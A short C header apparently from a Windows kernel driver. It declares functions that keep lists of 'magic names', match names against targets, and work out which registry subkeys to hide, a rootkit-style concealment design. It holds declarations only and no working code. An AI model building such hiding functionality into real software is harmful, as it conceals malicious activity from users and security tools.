#pragma once
#include "stdafx.h"
#include "Settings.h"

NameNode* CreateNameNode(const wchar_t* NameBuffer, const size_t NameLength);
void FreeNameNode(NameNode* nn);
NTSTATUS appendNameNode(Target target, NameNode* NewNameNode);
NTSTATUS removeNameNode(Target target, const wchar_t* NameToRemove);
int matchMagicNames(const wchar_t* NameToCheck, enum Target target);
size_t GetSettingsDumpSizeBytes();
void PrintRegistryKeyHandleInformation(HANDLE KeyHandle, const wchar_t* CallingFunctionName);
NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubkeyIndexesCount, _Out_ PULONG OkSubkeyIndexesCount, _Out_ PULONG* OkSubkeyIndexes);